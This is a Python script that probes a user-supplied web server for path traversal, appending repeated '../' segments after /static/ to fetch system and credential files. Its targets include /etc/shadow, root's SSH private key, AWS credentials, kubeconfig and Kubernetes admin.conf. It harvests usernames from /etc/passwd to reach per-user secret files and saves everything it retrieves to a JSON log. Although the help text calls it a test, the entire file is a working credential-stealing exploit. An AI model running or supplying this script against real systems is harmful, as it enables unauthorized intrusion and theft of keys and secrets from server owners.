import argparse
import http.client
import urllib.parse
import re
import json
import hashlib

def send_request(host, port, path):
    try:
        connection = http.client.HTTPConnection(host, port)
        connection.request("GET", path)
        response = connection.getresponse()
        data = response.read()
        connection.close()
        return response.status, data
    except http.client.RemoteDisconnected:
        return None, None
    except Exception as e:
        return None, None

def extract_usernames(data):
    usernames = set()
    lines = data.decode('utf-8').split('\n')
    for line in lines:
        if line:
            parts = line.split(':')
            if len(parts) > 1:
                username = parts[0]
                if username not in ['root', 'nobody', 'systemd-timesync', 'systemd-network', 'systemd-resolve', 'systemd-bus-proxy']:
                    usernames.add(username)
    return list(usernames)

def hash_content(content):
    return hashlib.sha256(content.encode('utf-8')).hexdigest()

def main():
    parser = argparse.ArgumentParser(description="Test website with custom port and disable SSL verification")
    parser.add_argument("-s", "--site", help="Specify website with port (e.g., http://example.com:8080)", required=True)
    parser.add_argument("-v", "--verbose", help="Enable verbose mode", action="store_true")
    parser.add_argument("-o", "--output", help="Specify output file for JSON log", required=False)
    args = parser.parse_args()

    parsed_url = urllib.parse.urlparse(args.site)
    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 80  # Default to port 80 if not specified
    base_path = parsed_url.path
    string = "../"
    payload = "/static/"

    # Define default files with associated regex patterns
    files_to_check = {
        "etc/passwd": r"root:.*:0:0:",
        "etc/shadow": r"root:.*:\d{4}:\d{4}:\d{4}:\d{4}:",
        "var/log/syslog": r"\w{3} \d{2} \d{2}:\d{2}:\d{2} \w+",
        "var/log/messages": r"\w{3} \d{2} \d{2}:\d{2}:\d{2} \w+",
        "etc/ssh/sshd_config": r"PermitRootLogin",
        "etc/ssh/ssh_config": r"Host \*",
        "root/.ssh/id_rsa": r"-----BEGIN RSA PRIVATE KEY-----",
        "root/.ssh/authorized_keys": r"ssh-rsa",
        "etc/mysql/my.cnf": r"\[mysqld\]",
        "etc/nginx/nginx.conf": r"user nginx;",
        "etc/httpd/conf/httpd.conf": r"ServerRoot",
        "etc/httpd/conf.d/ssl.conf": r"SSLCertificateFile",
        "var/lib/jenkins/config.xml": r"<secret>",
        "etc/kubernetes/admin.conf": r"client-certificate-data",
        "etc/gitlab/gitlab.rb": r"external_url",
        "home/user/.aws/credentials": r"\[default\]",
        "home/user/.kube/config": r"apiVersion",
        "etc/docker/daemon.json": r"\"log-level\"",
        "etc/rabbitmq/rabbitmq.config": r"{default_user,"
    }

    results = []
    usernames = []
    seen_hashes = set()

    # First extract usernames from /etc/passwd and /etc/shadow
    for key in ["etc/passwd", "etc/shadow"]:
        for i in range(20):
            path = f"{payload}{'../' * i}{key}"
            status, data = send_request(host, port, path)
            if status == 200:
                usernames += extract_usernames(data)

    # If no usernames found, use a default list of common usernames
    if not usernames:
        usernames = ["user", "admin", "test", "guest", "ubuntu"]

    for i in range(20):
        payload += string
        for file, regex in files_to_check.items():
            if "home/user" in file:
                for username in usernames:
                    user_file = file.replace("home/user", f"home/{username}")
                    path = f"{base_path}{payload}{user_file}"
                    print(f"[+] Testing with {host}:{port}{path}")
                    status, data = send_request(host, port, path)
                    
                    if status:
                        if status == 200:
                            content = data.decode('utf-8')
                            content_hash = hash_content(content)
                            if re.search(regex, content) and content_hash not in seen_hashes:
                                seen_hashes.add(content_hash)
                                result = {
                                    "file": user_file,
                                    "path": path,
                                    "content": content
                                }
                                results.append(result)
                                print(f"Valid response for {user_file}:")
                                print(content)
                        elif args.verbose and (status == 404 or status == 403):
                            print(f"{host}:{port}{path} returned status code {status}")
            else:
                path = f"{base_path}{payload}{file}"
                print(f"[+] Testing with {host}:{port}{path}")
                status, data = send_request(host, port, path)
                
                if status:
                    if status == 200:
                        content = data.decode('utf-8')
                        content_hash = hash_content(content)
                        if re.search(regex, content) and content_hash not in seen_hashes:
                            seen_hashes.add(content_hash)
                            result = {
                                "file": file,
                                "path": path,
                                "content": content
                            }
                            results.append(result)
                            print(f"Valid response for {file}:")
                            print(content)
                    elif args.verbose and (status == 404 or status == 403):
                        print(f"{host}:{port}{path} returned status code {status}")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"Results written to {args.output}")

if __name__ == "__main__":
    main()
